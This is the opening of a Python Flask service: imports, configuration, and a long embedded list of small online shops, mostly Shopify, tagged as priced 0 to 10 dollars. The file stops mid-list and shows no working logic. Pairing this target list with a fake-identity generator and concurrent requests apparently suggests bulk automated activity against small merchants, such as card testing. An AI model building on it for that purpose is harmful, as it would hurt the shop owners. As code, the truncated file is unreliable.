import os
import re
import json
import random
import time
import asyncio
import aiohttp
import sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from dotenv import load_dotenv
from faker import Faker
from datetime import datetime
import logging

load_dotenv()

# ── App setup ──────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app)
limiter = Limiter(app=app, key_func=get_remote_address,
                  default_limits=[os.getenv("RATE_LIMIT", "50 per minute")])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ──────────────────────────────────────────────────────────────
PORT = int(os.getenv("PORT", 8080))
API_KEY = os.getenv("API_KEY")
USE_MOCK_FALLBACK = os.getenv("USE_MOCK_FALLBACK", "true").lower() == "true"
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", 10))
DB_FILE = os.getenv("DB_FILE", "sites.db")

# ── Embedded site list (1467 sites, 0‑10$) ──────────────────────────
SITES_DATA = """
https://mood.design
https://obsurfandskate.com
https://perennialsoaps.com
https://ddir.store
https://shop.spam.com
https://kitchencrop.com
https://challengecoinnation.com
https://violettestickers.com
https://cjstickershop.com
https://littlethingsstudio.com
https://decalsbymelissa.com
https://sunnydaysny.com
https://slaynsteelco.com
https://www.bearwallowherbs.com
https://passionworks.org
https://www.darklab.com
https://sweetiepie210.myshopify.com
https://pamelanielsen.com
https://bughunterbug.com
https://brickmini.com
https://merch.outlawbeer.com
https://lincolncitygifts.com
https://pacificparadiseprints.shop
https://www.teamblonde.com
https://deltacowebstore.com
https://dust-dreams-boutique.myshopify.com
https://ilymyl.myshopify.com
https://sugarnspiceartworks.myshopify.com
https://www.pipsticks.com
https://www.rhodypepper.com
https://shop.cuyamabuckhorn.com
https://numberonelaboratory.com
https://catchamerica.com
https://store.vermontpublic.org
https://wilderess.com
https://hoppybunnyshop.com
https://healingherbalsoups.com
https://www.thepaperquillingshop.com
https://www.parcelpaper.com
https://www.kartboy.com
https://westernweartexas.com
https://pipsticks.com
https://griffinpockettool.com
https://www.decornapkins.com
https://sterling-ink.com
https://www.storeyfamilyfarm.com
https://cowsandcrayons.com
https://papierplume.com
https://plantflix.com
https://thriveecosystems.com
https://slicklocks.com
https://www.fitzwrightfire.com
https://coronadobrewing.com
https://www.vanderslicekustomshop.com
https://aspire-pavers.myshopify.com
https://www.readkaleidoscope.com
https://www.brokeallday.com
https://www.coleyhome.com
https://whatifcreations.com
https://shopcrescentcityclay.com
https://littledaydreamco.com
https://kaldikollective.com
https://theclayfulco.com
https://claybydenae.com
https://ivylenashop.com
https://meadowandmae.com
https://coconutbarrel.com
https://jordanvalleydesigns.com
https://noelleearrings.com
https://ivyandpearlboutique.com
https://vyoletshop.com
https://relishbrand.com
https://www.sanjosemade.com
https://bigtexan.com
https://stickerpickle.com
https://malwestdesign.com
https://vinyldisorder.com
https://shop.caninestars.org
https://laylebymail.com
https://gratiadesignco.com
https://graciousgobbler.com
https://stickyriceco.com
https://armstrongoutpost.com
https://getnokes.com
https://florawestdesign.com
https://fuzzyloondesigns.com
https://www.shopisabellerose.com
https://store.graphql.org
https://brissonte.com
https://dingall.com
https://napieroutdoors.com
https://geekishglitterlacquer.com
https://cortinabearingco.com
https://polarfilament.com
https://ancutiecreations.com
https://millerbeesupply.com
https://the-mammoth-site.myshopify.com
https://shop.iyasumehawaii.com
https://earvolution.com
https://fitzwrightfire.com
https://hallmarkscrapbook.com
https://adropintheoceanshop.com
https://poppyspatina.com
https://roysrockets.com
https://jealousdevilshop.com
https://vanderslicekustomshop.com
https://threekeyscoffee.com
https://arkansas-outdoor-power-equipment.myshopify.com
https://electro-smith.com
https://donnadsboutique.myshopify.com
https://alpenglowsupply.com
https://bagito.co
https://carlisleprintz.myshopify.com
https://sugly.net
https://aroma-on-the-go-2.myshopify.com
https://16charmzzz.myshopify.com
https://2b1da6-b2.myshopify.com
https://angrygnomerc.myshopify.com
https://andygiftora.myshopify.com
https://bbsellc.myshopify.com
https://22kill.myshopify.com
https://8z36dg-yw.myshopify.com
https://absolute-alternatives-2.myshopify.com
https://all-things-cherrie.myshopify.com
https://aimintgear.myshopify.com
https://739c98.myshopify.com
https://betty-hunley-designs.myshopify.com
https://allthingsbykeisha.myshopify.com
https://advanced-clinicals.myshopify.com
https://5a655b-27.myshopify.com
https://blessyourbeautycosmetics.myshopify.com
https://cascade-lavender.myshopify.com
https://bluedarkfiracustomgifts.myshopify.com
https://clothingunder10.myshopify.com
https://chi-candle.myshopify.com
https://davids-toothpaste.myshopify.com
https://deodorantstones.myshopify.com
https://cleanslateessentials.myshopify.com
https://blusand.myshopify.com
https://elastic-band-co.myshopify.com
https://eb-tees-2.myshopify.com
https://discountgearxpress-3.myshopify.com
https://demun-jones-merchandise.myshopify.com
https://crazy-squirrel-game-store.myshopify.com
https://ecgfb0-qx.myshopify.com
https://chocorush.myshopify.com
https://direction-for-our-times-usa.myshopify.com
https://essentialnc.myshopify.com
https://ef28ea.myshopify.com
https://floppy-ear-farm.myshopify.com
https://elite-party-products.myshopify.com
https://freshwolf.myshopify.com
https://fortheloveofhair.myshopify.com
https://glamorousbeautycosmeticss.myshopify.com
https://fridge-magnet-world.myshopify.com
https://funnysunnylps.myshopify.com
https://glass-boards-direct.myshopify.com
https://fairy-miniatures.myshopify.com
https://glovies.myshopify.com
https://grit-coffee.myshopify.com
https://gravebeforeshaveshop.myshopify.com
https://gobi-gear.myshopify.com
https://green-mountain-adventure-middlebury-mountaineer.myshopify.com
https://gravity-razors.myshopify.com
https://hifi-live.myshopify.com
https://humphreys-handmade.myshopify.com
https://huxley-kent.myshopify.com
https://indigo-private-label.myshopify.com
https://jane-gee.myshopify.com
https://kalastyle.myshopify.com
https://la-familia-green.myshopify.com
https://kitin-beauty.myshopify.com
https://k-kraft-vintage.myshopify.com
https://kbongmerch.myshopify.com
https://kevin-adams-photography.myshopify.com
https://la-fountain-herbal.myshopify.com
https://lashyb.myshopify.com
https://lavishhairserum.myshopify.com
https://lenas-creations23.myshopify.com
https://knotandbow.myshopify.com
https://intheclutchclothing.myshopify.com
https://lunableucandles.myshopify.com
https://little-things-vintage.myshopify.com
https://lumibymari-0303.myshopify.com
https://lapelpinplanet.myshopify.com
https://mason-jar-candles-co.myshopify.com
https://loc-d-lovely.myshopify.com
https://me-time-botanicals.myshopify.com
https://maintainingmediocrity.myshopify.com
https://mikesseasonings.myshopify.com
https://jollity-co.myshopify.com
https://martinez-sonz.myshopify.com
https://move-to-amend.myshopify.com
https://make-your-own-polish.myshopify.com
https://michigan-brand.myshopify.com
https://refill-services.myshopify.com
https://mount-royal-soap-co.myshopify.com
https://mossy-pond-pro-shop.myshopify.com
https://mswkwy-as.myshopify.com
https://www.lliked.com
https://stuffypuffs.com
https://1uniqueu.com
https://2a2aad.myshopify.com
https://www.swiitcreations.com
https://00106d-0f.myshopify.com
https://2ce751-2.myshopify.com
https://085716-5.myshopify.com
https://2-towns-ciderhouse.myshopify.com
https://1d7e49-01.myshopify.com
https://108collective.myshopify.com
https://1to1music.co.uk
https://28collective.com
https://2sistersredeux.com
https://2d0add-d6.myshopify.com
https://514553.myshopify.com
https://47fitnessapparel.myshopify.com
https://5aace1.myshopify.com
https://5ba57f-4d.myshopify.com
https://6cbb37.myshopify.com
https://41c631-5.myshopify.com
https://5mmpaper.com
https://690e6b-2.myshopify.com
https://64-ounce-games.myshopify.com
https://868900.myshopify.com
https://708bf4-2.myshopify.com
https://8f5cf2.myshopify.com
https://7magok.com
https://a15f3d-2.myshopify.com
https://988d82-5e.myshopify.com
https://92acaf-79.myshopify.com
https://969ad2-3.myshopify.com
https://a-reason-for.myshopify.com
https://9aa5a7.myshopify.com
https://9c2be0-68.myshopify.com
https://a-f-drum-co.myshopify.com
https://7f45c6-2.myshopify.com
https://943925-c1.myshopify.com
https://academy-of-makeup.myshopify.com
https://abeautifulcalling.com
https://academichoods.myshopify.com
https://abushelandapeckmn.com
https://accubowdev.myshopify.com
https://adr-products.com
https://affordableebikes.myshopify.com
https://aha-crafted.myshopify.com
https://admin-cleure.myshopify.com
https://aksahomedecor.com
https://alexcar.com
https://aha-wrap.myshopify.com
https://agrariaome.myshopify.com
https://alka-hydrate.com
https://airplantdirect.com
https://alg-alc.myshopify.com
https://ahluwalia-world.myshopify.com
https://africanangelart.com
https://additionallengths.myshopify.com
https://aha-designs.myshopify.com
https://allgoodthings.store
https://allseasonshousedecor.com
https://alarme360.fr
https://alldesignsequine.com
https://allthingselderberry.com
https://allthebitter.myshopify.com
https://americandominiondecor.com
https://american-made-general-store.myshopify.com
https://aloveofdogs.com
https://ameico.myshopify.com
https://alice-naylor-leyland.myshopify.com
https://alljigsawpuzzles.myshopify.com
https://amitycoffee.co
https://alluredesigncreations.com
https://american-soft-linen.myshopify.com
https://amrdesignshop.com
https://american-cornhole-association.myshopify.com
https://alphaindcc.myshopify.com
https://amishtables.com
https://alvahouseofstyle.com
https://amournoir.myshopify.com
https://anayatreasures.com
https://anchoredsouldesigns.com
https://anawiz.com
https://angelohome.com
https://anettes-chocolate-factory.myshopify.com
https://animalsuppliesdepot.com
https://annasworks.com
https://angelasimeone.com
https://anniemoran.com
https://anna-pookie.myshopify.com
https://antiquesbytess.com
https://antiquebyzrm.com
https://antique-archeology-3333.myshopify.com
https://apollo-automation.myshopify.com
https://arbor-row.com
https://appalachianspring.com
https://arranmorelighting.com
https://aromasparks.com
https://annoyingseagull.com
https://arlobelle.com
https://anotherseasonwaco.myshopify.com
https://aprilpaigefineart.com
https://aretescontacones.com
https://arellanostudios.com
https://arterahome.com
https://aria-home.com
https://artachehotel.com
https://art-of-scott-spillman.myshopify.com
https://antiquesandchic.com
https://artisan-alloys.com
https://arts-et-matieres.myshopify.com
https://atlas-haircare.myshopify.com
https://asianahomedecor.com
https://ashtonsdesignanddoodles.com
https://ascentionbeautyco-com.myshopify.com
https://atp-sports.myshopify.com
https://atbtdaily.com
https://atomicfreedom.myshopify.com
https://aurorasaromas444.myshopify.com
https://austin-shin-store.myshopify.com
https://ashlyns-diy-drip.myshopify.com
https://avenueofoaksdecor.com
https://asha-project.myshopify.com
https://artstoreonline.com.au
https://azestfor.myshopify.com
https://ayla-beauty.myshopify.com
https://bamboo-bamboo.myshopify.com
https://beachhousefurnitureandinteriors.com
https://bajaboard2.myshopify.com
https://bcandy.com
https://aysuconcept.com
https://bathromance.myshopify.com
https://barnyardcustomcreations.com
https://beautifulearth-boutique.myshopify.com
https://back9press.com
https://beech-birch.myshopify.com
https://bbcandle.com
https://bespokecrestco.myshopify.com
https://beauty-heroes-us.myshopify.com
https://bestdarnfoods.com
https://bettershoppeonline.com
https://bearandrose.co.uk
https://bestflag.com
https://beulahmeadowsdesigns.com
https://black-rooster-rye.myshopify.com
https://berbereimports.com
https://beautiful-the-beauty.myshopify.com
https://blessedbegifts.com
https://blackjack-wax-co.myshopify.com
https://bluestemandco.com
https://bleachykeen.com
https://big-box-of-razors.myshopify.com
https://bluespringshome.com
https://bluntsteel.com
https://bonlookus.myshopify.com
https://boredathome.shop
https://bogroaddesigns.com
https://bontcycling.myshopify.com
https://bonnie-clyde-la.myshopify.com
https://boonboo.myshopify.com
https://botanikaslc.com
https://biloban.com
https://brandedheartjewelry.myshopify.com
https://bous-candles.myshopify.com
https://boundarysupply-com.myshopify.com
https://brahmcollection.com
https://boxofgraphics.com
https://brick-street-merchandise.myshopify.com
https://brimariepopcorn.com
https://brendafridaydesign.com
https://broochella.myshopify.com
https://brightechshop-2.myshopify.com
https://braggiogifts.com
https://buddhaspop.com
https://brubaker-usa.com
https://brooklyncandlestudio.com
https://briteidea.com
https://bullterrier.world
https://bounce-mkt.myshopify.com
https://built-bar.myshopify.com
https://bunkhousestudiollc.com
https://build-better-bricks.myshopify.com
https://bumbleholler.com
https://burntoctober.com
https://burak-348.myshopify.com
https://buyautosupply.com
https://bunkyboutique.com
https://buymeonce.myshopify.com
https://butler-luxury.myshopify.com
https://c8kgcg-mv.myshopify.com
https://byggeligt.com
https://by-carlheim.myshopify.com
https://cabocoffee.myshopify.com
https://by-isabelle-design.myshopify.com
https://cactico.com
https://c053bd-51.myshopify.com
https://bycrea-staging.myshopify.com
https://campinquisitive.myshopify.com
https://caliper-garage.myshopify.com
https://camysgrammy.com
https://canicechic.com
https://calyan.myshopify.com
https://camdenrose.com
https://canseamer.myshopify.com
https://canyonridgestudio.com
https://caravanhomedecor.com
https://cantrip-candles.myshopify.com
https://carolinashoresnaturalsoap.com
https://callmeoldfashionedvintageshop.com
https://cadycreations.myshopify.com
https://canvashomestore.com
https://carolinapine.com
https://capitalgifts.com
https://casadechocolates.com
https://car-kitchen.myshopify.com
https://cba7ff-a8.myshopify.com
https://casefurniture.com
https://cb-creations-llc.myshopify.com
https://catholiccentral.shop
https://ccp-dev.myshopify.com
https://caresandwhoas.com
https://chaircapsaustralia.com.au
https://chateletusa.com
https://chandelierias.com
https://christybhome.com
https://chpbeta.myshopify.com
https://cavanimenswear.myshopify.com
https://celebrationwarehouse.myshopify.com
https://cieluxe.com
https://chopvalue.com
https://cdstencils.com
https://chowdhurydresses.com
https://christinesartworld.com
https://cgcinteriors.co.uk
https://chokers.co.uk
https://circleandwick.myshopify.com
https://circuitscribe.com
https://citibin.myshopify.com
https://cityofindustryshop.com
https://citimodern.com
https://clafoutis.myshopify.com
https://clippercrafts.com
https://ciro-jewellery.myshopify.com
https://clevelandstreetnovelties.com
https://classic-fella1.myshopify.com
https://clinedesigncreations.com
https://clickandstitchembroidery.com
https://cloztohome.com
https://closet-exchange-store.myshopify.com
https://cobblecandles.com
https://cocovillage.com
https://clothes-mentor-turkey-creek.myshopify.com
https://coffeeandcandlesllc.com
https://clasterior.co.uk
https://comfortsleepsystems.myshopify.com
https://cloudanimestudio.com
https://coffeerugs.com
https://coconut-lane.myshopify.com
https://coeurdartichaut.ca
https://cocobear.store
https://comfykilnstudio.com
https://consignmentchick.com
https://coast2coastcollection.com
https://cooperandcohome.com
https://conymaradiaga.com
https://cosmakery.com
https://coraldaisydesigns.com
https://corknleaf.com
https://cornishprints.com
https://comfortstyle.co.uk
https://comosum.co
https://cottlegunn.com
https://corpsbuckle.myshopify.com
https://cowboysnapback.com
https://counterpointdesignresources.com
https://constructiveplaythings.myshopify.com
https://couleur-nature.myshopify.com
https://covehanger.myshopify.com
https://craftsbyesty.com
https://crawfordcreekdesigns.com
https://cottonwoodcompany.com
https://create-a-mural.com
https://crochetrecipes.com
https://crewbikeco.com
https://craftybynumbers.com
https://cravewares.com.au
https://crafternv.com
https://crowandmoss.com
https://crookedcreekantlerart.com
https://creativeelements.shop
https://crafts-4-kids.myshopify.com
https://curatedcharacter.com
https://creolesizzle.com
https://curateyourhome.com
https://cutandcuredco.com
https://crystalwedding.myshopify.com
https://custombowequipment.myshopify.com
https://daddyvans.com
https://d0281e-fe.myshopify.com
https://cutieptootiebykaren.com
https://curatedhomedecor.com
https://daphnew.com
https://cullensbabyland.us
https://daluaaustralia.myshopify.com
https://darceys-candles-uk.myshopify.com
https://darevie-shop.myshopify.com
https://darlinghomebody.com
https://danique-jewelry.myshopify.com
https://dashl-shop.myshopify.com
https://darpaha.com
https://deboerwetsuits.myshopify.com
https://de-buyer.myshopify.com
https://decoazul.net
https://danielledrollins.com
https://deal-genius-main.myshopify.com
https://dekorliving.com
https://dearyesteryear.com
https://dermae.myshopify.com
https://designbysml.myshopify.com
https://deeringbanjos.myshopify.com
https://designsbylaurelleigh.com
https://designsbykatherine.net
https://decopompoms.myshopify.com
https://desifavors.com
https://diamond-b-westernboutique.com
https://diamondback-gear.myshopify.com
https://delsbrix.myshopify.com
https://dianejameshome.com
https://diamondsbodycare.com
https://diaperlab.com
https://divineoilco.com
https://decorstly.com
https://dirt-gear-co.myshopify.com
https://disposable-food-and-beverage-packaging-solutions.myshopify.com
https://dirt-cheap-dungeons.myshopify.com
https://dlumiere-esthetique.myshopify.com
https://diytree.com
https://drbdentalsolutions.com
https://dragonfly-thrift-boutique.myshopify.com
https://dr-bailey-skin-care.myshopify.com
https://durvage.com
https://doubletroublebologna-com.myshopify.com
https://dustyduckdesigns.com
https://dtftransferohio.com
https://duralexusa.com
https://driftwoodmarket.net
https://ducttapeanddenimshop.com
https://dwellfeel.myshopify.com
https://dollar-western-wear.myshopify.com
https://distinctioncrystalsandfossils.com
https://eastmagnoliaboutique.com
https://eamti.myshopify.com
https://eagle-creek-holding.myshopify.com
https://ebestsale.myshopify.com
https://eb1803-2.myshopify.com
https://dustandgrace.com
https://easylinencrafts.com
https://eggbarvise.com
https://eightbitboutique.com
https://eclecticarray.com
https://educiro.com
https://eightoclock.com
https://edithandblanche.com
https://elevate-stand-co.myshopify.com
https://elementsbyanupa.com
https://elegant-packaging-co.myshopify.com
https://elikia-africa-store.myshopify.com
https://element-tree-essentials.myshopify.com
https://elementsmedina.com
https://elfminiatures.co.uk
https://elevation-supply.myshopify.com
https://elbakerart.com
https://elorea.myshopify.com
https://emmaallen.ca
https://elm-dirt.myshopify.com
https://emilylex.myshopify.com
https://edwardmartin.com
https://en-route-jewels.myshopify.com
https://ekchichome.com
https://enabling-technologies.myshopify.com
https://elenorra.com
https://enchantedhomedesign.com
https://endlessembers.net
https://essoc.shop
https://estilomexicanoboutique.com
https://ericahuuvadesign.myshopify.com
https://engagedera.com
https://essential-botanicals.myshopify.com
https://engravedhappyism.com
https://essenceofase.com
https://eskell.com
https://enjoy-the-ride-records.myshopify.com
https://evamalley.com
https://evasonaike.com
https://etuhome.com
https://evelynsoriginal.com
https://evatrends.myshopify.com
https://emilybspeech.com
https://everyday-fancy-candle-co.myshopify.com
https://europeanfoodandgifts.com
https://extraandordinarydesign.com
https://evelina-apparel.com
https://explodingkittens.myshopify.com
https://exped-usa.myshopify.com
https://factualobjects.com
https://evileyefavor.myshopify.com
https://fatbike.com
https://famo3dprintshop.com
https://fantasia-mining.myshopify.com
https://fancyfischer.com
https://fabriccraftsfinesse.com
https://fabiahgoff.com
https://farrellvalleyford.com
https://extravaganceindesign.com
https://fairygardenglow.com
https://findinghomefarms.com
https://felinefancy.co.uk
https://finalbendfitness.com
https://festivecreationsbystephanie.com
https://ff589d-f9.myshopify.com
https://finerlydecor.com
https://fieldsforellie.com
https://finleysexotictreatsllc.com
https://fivewayscoffee.com
https://federal-bikes.myshopify.com
https://flensted-art-us.com
https://fleurdeluneskin.com
https://fleurdelisjunkie.com
https://floridashellsandmore.com
https://flamingo-candles-ltd.myshopify.com
https://fleurnabertcreations.com
https://flipskateboards.myshopify.com
https://florida-water-lanman-and-kemp.myshopify.com
https://floursacktowels.myshopify.com
https://fluke-jewellery.myshopify.com
https://foamnasium.com
https://flypaperproducts.com
https://forposhsake.com
https://freshdesignsandco.com
https://finishingtouchpublishing.com
https://fleurtygirl.com
https://forbiddenoracle.net
https://francaise-shop.com
https://flyingbobbins.com
https://formosacovers.com
https://frenchvintageprints.com
https://freshstartcandles.com
https://furtaztic.com
https://fwhairoverstock.myshopify.com
https://footlights-dance-theatre-boutique.myshopify.com
https://frictionlabs.myshopify.com
https://foxford-ireland.myshopify.com
https://gardenshomedecor.com
https://gabbyglamcosmetics.com
https://gardensundials.com
https://gathermercantile.com
https://gansettoutfitters.com
https://gelato-supply.myshopify.com
https://getmytools.com
https://gingys.com
https://gendefy.com
https://getdecaled.com
https://gallopguru.com
https://glassacademy.com
https://giftshire.com
https://gn-ltd.myshopify.com
https://glisten-cosmetics.myshopify.com
https://gldnxlayeredandlong.myshopify.com
https://gold-plating.myshopify.com
https://graygableshome.com
https://gracefulcreationsbygraciela.com
https://gndcreations.com
https://givingtreehome.com
https://giftology-uk.com
https://greentree-home-candle.myshopify.com
https://gomable-com.myshopify.com
https://graymuzzlesociety.org
https://greenway-sustainable-containers.myshopify.com
https://goodordering.myshopify.com
https://goldenlighting.com
https://groomathome.shop
https://h0lys-art-corner.myshopify.com
https://haihaianimeshop.us
https://griffinhomedecor.com
https://hangerad.myshopify.com
https://hamletproducts.com
https://gypsysoulstore.com
https://happilyeveraftersociety.com
https://gretchenshaus.com
https://hario-usa.com
https://harmonioushomeaccents.com
https://harborsideropeworks.com
https://hangerbee.myshopify.com
https://hairdynamicsalon.com
https://harperhoweyinteriors.com
https://harper-jewelry.myshopify.com
https://grownmanshave.myshopify.com
https://harryscoinshop.myshopify.com
https://hawaiianqueencoffee.com
https://hdcustomdesign.shop
https://happy-piranha.myshopify.com
https://heritage2016.myshopify.com
https://heartell-press.myshopify.com
https://hearts-content.com
https://heartlandaromaoasis.com
https://herban-cowboy.myshopify.com
https://happywoodproducts.com
https://highcottoncreations.com
https://herbestfootforward.com
https://hiro-taka.myshopify.com
https://hillbilly-peddler-and-company.myshopify.com
https://hello-304.myshopify.com
https://hfexpo.myshopify.com
https://hiromi-paper-inc.myshopify.com
https://holylamborganics.myshopify.com
https://helpmedicalsupplies.com
https://hjanejewels.com
https://home-ec.co
https://home-zone-living.myshopify.com
https://homedecor-plus.com
https://homebrandedco.com
https://homeinharmonydesigns.com
https://hester-and-cook.myshopify.com
https://homestotreasureshop.com
https://homebycedargrove.com
https://homehavendecor.com
https://hipoptical-usa.myshopify.com
https://honey-bucket.myshopify.com
https://honeyandhopeco.com
https://homecollectionllc.com
https://honeyandhivefw.com
https://honeydo-picture-frame-products.myshopify.com
https://horse-house.myshopify.com
https://homeonwaterst.ca
https://hundredhearts.myshopify.com
https://houseofmargotblair.com
https://honeysilks-co.myshopify.com
https://hunterkouture.com
https://hydropeptidestore.myshopify.com
https://house-of-mana-up.myshopify.com
https://hydeboutique.co.nz
https://idea-mountain-bags.myshopify.com
https://ihfhomedecor.com
https://huttogeneralstore.com
https://i-heart-eyewear.myshopify.com
https://huset-shop.com
https://ihisa.com
https://idewcare.myshopify.com
https://ilyapa.com
https://icarusfidget.com
https://huubukstore.myshopify.com
https://indomie.us
https://indianasapplepie.myshopify.com
https://in-style-eyes.myshopify.com
https://import-powder-mix-direct.myshopify.com
https://induscarpets.com
https://imaginediy.myshopify.com
https://ingridscents.myshopify.com
https://indycar-store.myshopify.com
https://industrytile.com
https://inoarus-com.myshopify.com
https://interiordesignbyemily.myshopify.com
https://intelligent-nutrients.myshopify.com
https://intellitec.myshopify.com
https://ironandblossom.com
https://inspireddecorstore.com
https://islandgale.store
https://islandlifehammocks.com
https://italiving.us
https://ironexile.com
https://islandboy.shop
https://interoknack.com
https://jack-georges.myshopify.com
https://indyhomedesign.com
https://jamesdar.com
https://janellesacrylicart.com
https://jdmwoodcreations.com
https://jdg8t6-tj.myshopify.com
https://jackson-s-storefront.myshopify.com
https://jenisprouts.com
https://jason-markk-inc.myshopify.com
https://jcfurnitureshop.com
https://italmodfurniture.com
https://jfrancesantiques.co.uk
https://japanese-knife-imports.myshopify.com
https://johann-wolff.myshopify.com
https://jessicareynoldsart.com
https://jnjgiftsandmore.com
https://john-mark-enterprises.myshopify.com
https://jewelers-touch-brea.myshopify.com
https://jhortonstore.com
https://jentrie.com
https://journeysmade.myshopify.com
https://juliehuhn.com
https://jonanik.com
https://justmustard.com
https://jurlique-us.myshopify.com
https://junehomesupply.com
https://katandbella.com
https://kaaterskillmarket.com
https://kailochic.com
https://keepsakecandlesinc.com
https://katewalton.com
https://kartique.com.au
https://keepatownweird.com
https://keepitbright.co.uk
https://khmeroverseas.com
https://kellys-cove-reunion.myshopify.com
https://kamajimarket.com
https://keylimepieco.com
https://kitschydelish.com
https://keystonesteelco.com
https://kevinsgiftshoppe.com
https://kikbo.com
https://knottythingswoodworks.com
https://laceylanecreative.com
https://kittybadhands.com
https://kreisdesign.com
https://krystalmichelleart.com
https://kiraliving.com
https://last-boks.com
https://kyleemaedesigns.com
https://lacosechacoffee.com
https://kycustomengraving.com
https://laembajada.shop
https://krafftliquidations.com
https://larreacove.com
https://latenightdrivehome.store
https://laredoframefactory.com
https://lastaristocrat.com
https://laserfocusedxpressions.com
https://laterzacoffee.com
https://lavalamps.shop
https://lauriekentdesigns.com
https://lauradukefineart.com
https://laurendunn.com
https://laurelandtwine.com
https://lelereis.com
https://lawacandles.com
https://lavishdesigns803.com
https://les-oreves.com
https://lemieuxstore.myshopify.com
https://letsgohometeam.com
https://liamevelyn-boutique.myshopify.com
https://letoilesport.com
https://littleblueswallow.com
https://librarybydesign.com
https://little-change-creators.myshopify.com
https://lewisdesigncompany.com
https://little-sycamore.myshopify.com
https://lebzone.com
https://lockpickworld-us.myshopify.com
https://lightandtimeart.com
https://letterpressplay.com
https://lizajoyner.com
https://lorabees.com
https://locker61.com
https://littlerebelscause.com
https://lotus-linen.myshopify.com
https://lovenene.com
https://lostwestern.com
https://lorenzenfarmart.org
https://loveucandle.com
https://lostkat.com
https://lovaludesign.com
https://lunaralivingdecor.com
https://lowpricesfastshipping.com
https://lovepittsburghshop.com
https://lumberandlinen.com
https://lovetheprintdesigns.com
https://lunkerhunt.myshopify.com
https://lumekeebs.com
https://lunddesignhouse.com
https://luxedesignsco.com
https://lushdecor.com
https://loomefabrics.co.uk
https://luxury-handles.co.uk
https://luztierra.com
https://lwsboutique.com
https://maeminiworld.com
https://lxlounge.myshopify.com
https://magnificent-quilt.myshopify.com
https://madebykourmoulis.com
https://madmia-store.myshopify.com
https://luxuryoutdoorfurniture.com
https://maddylus.com
https://madhappenings.com
https://mainetti-usa.myshopify.com
https://mailpostsystems.com
https://lovelyantiqueprints.com
https://lustergifts.com
https://majorprepapparel.com
https://luxxdesign.com
https://magicleaftees.com
https://mamasguavabars.myshopify.com
https://mall.aroomy.com
https://maggardrazors.myshopify.com
https://manddmercantile.com
https://maniacal-adventures.myshopify.com
https://maritamahome.com
https://mandarina-duck-web.myshopify.com
https://mandalacraftsinc.com
https://mamabearblue.com
https://mandalacraftsinc.myshopify.com
https://mcguiresclocks.com
https://maverickbicycles.com
https://mattswarehouse.myshopify.com
https://manready-mercantile.myshopify.com
https://mauisfinestgifts.com
https://matuu.eu
https://mcmavenue.com
https://margaretsconsignment.myshopify.com
https://me-motherearth.myshopify.com
https://market.coppercreeklandscapes.com
https://megwagler.co
https://memorialmuseum.myshopify.com
https://meeheehanbok.com
https://mentari.toys
https://martinmetalwork.com
https://memoryjarscentedcreations.com
https://megan-salmon.myshopify.com
https://mermadehair.com
https://meister-intl.myshopify.com
https://medusasmakeup.myshopify.com
https://meco7.com
https://melrosehomedesign.com
https://metrocs-global.com
https://mexico-by-hand.myshopify.com
https://metalhead-art-design-llc.myshopify.com
https://mgc-gaming-shop.myshopify.com
https://mercantilemountain.com
https://metaldice.myshopify.com
https://minaal.myshopify.com
https://millyrosecrafts.com
https://mobilepixels.myshopify.com
https://mintyyartz.myshopify.com
https://michaelmichaud.myshopify.com
https://midwestfabrics.com
https://mialmastore.com
https://monogrammary.com
https://modlifestyles.com
https://mocha-australia.myshopify.com
https://morningtideshop.com
https://modernnomadhome.com
https://mothmanempire.com
https://moore-collection.myshopify.com
https://miniadaydesigns.com
https://monster-fight-club.myshopify.com
https://motomomsdecor.com
https://mystmart.com
https://mstreetdecor.com
https://modernbungalow.com
https://naked-goat-soap-company-elevated.myshopify.com
https://nassifskincare.myshopify.com
https://nbwoodworks.us
https://nakedcashmere.com
https://myamericancrafts.com
https://museumofglassstore.org
https://nalanibotanics.com
https://museum-shop-pompei.myshopify.com
https://myurbantoddler.com
https://nativeamericanmerchandise.com
https://nantucketlooms.com
https://myfabricplace.co.uk
https://neat-method.myshopify.com
https://nebula-kids.com
https://nenepal.com
https://naked-armor.myshopify.com
https://nauticaldecorandgifts.com
https://nerdy-nuts.myshopify.com
https://nectar-creations.myshopify.com
https://nefertariorganics.com
https://nestvintageandhome.com
https://newdirectioncrafters.com
https://nikkiworkshop.com
https://nexaraliving.com
https://newton-distributing.myshopify.com
https://noblewinter.com
https://nmpricklypearfest.com
https://nook-test-2539.myshopify.com
https://norrismerchandise.com
https://norton-supply.myshopify.com
https://nadahome.it
https://nonickel-com.myshopify.com
https://ocean-sales-usa.myshopify.com
https://o-h.jp
https://newdsalem.myshopify.com
https://oceandriftdesignshop.com
https://nutrikey.myshopify.com
https://nurture-valley.myshopify.com
https://ohbabystyle.com
https://ohgeezdesign.com
https://olivelyhome.com
https://one-iron-golf.myshopify.com
https://nurserycouture.com
https://olivieri-1882-usa.myshopify.com
https://nfrdesigns.com
https://of-life-lemons.myshopify.com
https://osmology.com
https://otofonix-llc.myshopify.com
https://oskiaskincare.com
https://oui-shave.myshopify.com
https://orthoequine.com
https://oakleyhomegifts.com
https://orchardcorset-2.myshopify.com
https://orchardvalleysupply-com.myshopify.com
https://one-world-shop-cleveland.myshopify.com
https://ozsmartco.myshopify.com
https://paintedswan.com
https://parafernalia-italia.myshopify.com
https://paintingladydesigns.com
https://papagaiostudio.com
https://parakeetslimesshop.com
https://peachiepie.co.uk
https://pedaltrain.myshopify.com
https://pb-0110.myshopify.com
https://paulmichaelcompany.com
https://patinascavecreek.net
https://pearlsignco.com
https://perryhillrustics.com
https://pearl-river-mart.myshopify.com
https://personalspacemb.com
https://pickler.studio
https://pathwaymarket.shop
https://pingchatea.com
https://piecesonmain.com
https://petraboase.com
https://phoenixmenswear.com.au
https://pinkpigwestport.com
https://plantron.net
https://piusmarketing.com
https://pinkdoxieboutique.com
https://pilotslime.com
https://polarboutique.ca
https://plywerk.com
https://posterncoffee.com
https://plywoodproject.com
https://pinkvanilla.com
https://playlovetoys.ca
https://polypaige.myshopify.com
https://prairiesagehome.com
https://pilotmall.com
https://positively-me-boutique.myshopify.com
https://powertrc.com
https://prosperitycandle.com
https://provisionsstl.com
https://ppups.com
https://praimy.com
https://ptahcron.com
https://premierhomeandgifts.com
https://practical-art.com
https://puleointl.com
https://postfurnishings.com
https://quantumgamingstore.com
https://puppyhome.store
https://pwoodpro.co
